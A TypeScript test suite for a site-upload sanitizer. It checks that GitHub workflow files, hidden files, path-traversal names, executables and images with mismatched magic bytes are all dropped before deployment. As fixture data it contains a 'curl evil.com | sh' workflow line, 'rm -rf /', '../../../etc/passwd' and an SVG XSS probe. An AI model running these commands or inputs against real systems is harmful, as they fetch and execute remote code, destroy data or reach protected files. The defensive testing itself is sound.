import { describe, it, expect } from 'vitest';
import {
  sanitizeUploadFiles,
  summarizeUpload,
  UploadValidationError,
  MAX_UPLOAD_FILES,
} from '../upload-sanitizer';

const INDEX = { path: 'index.html', content: '<h1>hi</h1>' };

// 1x1 투명 PNG
const PNG_BASE64 =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

function paths(result: { files: { path: string }[] }) {
  return result.files.map((f) => f.path);
}

describe('sanitizeUploadFiles — 워크플로우 인젝션 차단', () => {
  it('drops every .github/ path so only the server-injected workflow can exist', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: '.github/workflows/evil.yml', content: 'run: curl evil.com | sh' },
      { path: '.github/workflows/deploy.yml', content: 'run: exfiltrate' },
    ]);

    expect(paths(result)).toEqual(['index.html']);
    expect(result.skipped).toHaveLength(2);
    expect(result.skipped.every((s) => s.path.startsWith('.github/'))).toBe(true);
  });

  it('drops hidden files and directories', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: '.env', content: 'SECRET=1' },
      { path: 'assets/.hidden/keys.json', content: '{}' },
    ]);

    expect(paths(result)).toEqual(['index.html']);
    expect(result.skipped).toHaveLength(2);
  });
});

describe('sanitizeUploadFiles — 경로 무결성', () => {
  it.each([
    ['../../../etc/passwd', '상위 경로'],
    ['assets/../../secret.html', '상위 경로'],
    ['/absolute/index.html', '절대 경로'],
    ['assets\\win.html', '역슬래시'],
    ['a//b.html', '상위 경로'],
  ])('drops traversal-style path %s', (badPath) => {
    const result = sanitizeUploadFiles([INDEX, { path: badPath, content: 'x' }]);
    expect(paths(result)).toEqual(['index.html']);
    expect(result.skipped).toHaveLength(1);
  });

  it('drops paths containing control characters', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: `evil${String.fromCharCode(0)}.html`, content: 'x' },
    ]);
    expect(paths(result)).toEqual(['index.html']);
    expect(result.skipped[0].reason).toContain('제어 문자');
  });

  it('drops paths longer than the limit', () => {
    const result = sanitizeUploadFiles([INDEX, { path: `${'a'.repeat(300)}.html`, content: 'x' }]);
    expect(paths(result)).toEqual(['index.html']);
  });

  it('drops duplicate paths case-insensitively', () => {
    const result = sanitizeUploadFiles([INDEX, { path: 'Index.html', content: 'dup' }]);
    expect(result.files).toHaveLength(1);
    expect(result.skipped[0].reason).toContain('중복');
  });
});

describe('sanitizeUploadFiles — 확장자·크기 정책', () => {
  it('keeps ordinary static assets', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: 'style.css', content: 'body{}' },
      { path: 'app.js', content: 'console.info(1)' },
      { path: 'fonts/x.woff2', content: 'AAAA', encoding: 'base64' },
      { path: 'about/index.html', content: '<p>a</p>' },
    ]);
    expect(paths(result)).toHaveLength(5);
    expect(result.skipped).toHaveLength(0);
  });

  it('drops executable-ish extensions', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: 'run.sh', content: 'rm -rf /' },
      { path: 'tool.exe', content: 'AAAA', encoding: 'base64' },
      { path: 'shell.php', content: '<?php ?>' },
    ]);
    expect(paths(result)).toEqual(['index.html']);
    expect(result.skipped).toHaveLength(3);
  });

  it('drops an image whose magic bytes do not match its extension', () => {
    const notAPng = Buffer.from('<svg onload=alert(1)>').toString('base64');
    const result = sanitizeUploadFiles([
      INDEX,
      { path: 'real.png', content: PNG_BASE64, encoding: 'base64' },
      { path: 'fake.png', content: notAPng, encoding: 'base64' },
    ]);
    expect(paths(result)).toEqual(['index.html', 'real.png']);
    expect(result.skipped[0].path).toBe('fake.png');
  });

  it('drops an oversized text file but keeps the rest', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: 'huge.txt', content: 'a'.repeat(3 * 1024 * 1024) },
    ]);
    expect(paths(result)).toEqual(['index.html']);
    expect(result.skipped[0].reason).toContain('너무 큽니다');
  });
});

describe('sanitizeUploadFiles — 배포 불가 조건은 중단', () => {
  it('rejects when the file count exceeds the limit', () => {
    const files = Array.from({ length: MAX_UPLOAD_FILES + 1 }, (_, i) => ({
      path: `f${i}.html`,
      content: 'x',
    }));
    expect(() => sanitizeUploadFiles(files)).toThrow(UploadValidationError);
  });

  it('rejects when index.html is missing', () => {
    expect(() => sanitizeUploadFiles([{ path: 'about.html', content: 'x' }])).toThrow(
      /index\.html/,
    );
  });

  // GitHub Pages는 경로를 대소문자 구분해 서비스한다 — Index.html은 첫 화면이 되지 못하므로
  // 통과시키면 "배포는 성공했는데 사이트는 404"가 된다
  it('rejects Index.html as a substitute for index.html', () => {
    expect(() => sanitizeUploadFiles([{ path: 'Index.html', content: 'x' }])).toThrow(
      /index\.html/,
    );
  });

  it('rejects when every file was dropped', () => {
    expect(() => sanitizeUploadFiles([{ path: '.github/workflows/x.yml', content: 'x' }])).toThrow(
      UploadValidationError,
    );
  });

  it('rejects when the total size exceeds the limit', () => {
    // 개별 상한(2MB) 이하지만 합계가 25MB를 넘도록 구성
    const files = [INDEX, ...Array.from({ length: 20 }, (_, i) => ({
      path: `big${i}.txt`,
      content: 'a'.repeat(1_500_000),
    }))];
    expect(() => sanitizeUploadFiles(files)).toThrow(/전체 용량/);
  });
});

describe('summarizeUpload', () => {
  it('reports file count, byte total and skipped files', () => {
    const result = sanitizeUploadFiles([
      INDEX,
      { path: 'logo.png', content: PNG_BASE64, encoding: 'base64' },
      { path: '.env', content: 'SECRET=1' },
    ]);
    const summary = summarizeUpload(result);

    expect(summary.file_count).toBe(2);
    expect(summary.total_bytes).toBeGreaterThan(0);
    expect(summary.skipped_files).toEqual([
      expect.objectContaining({ path: '.env' }),
    ]);
  });
});
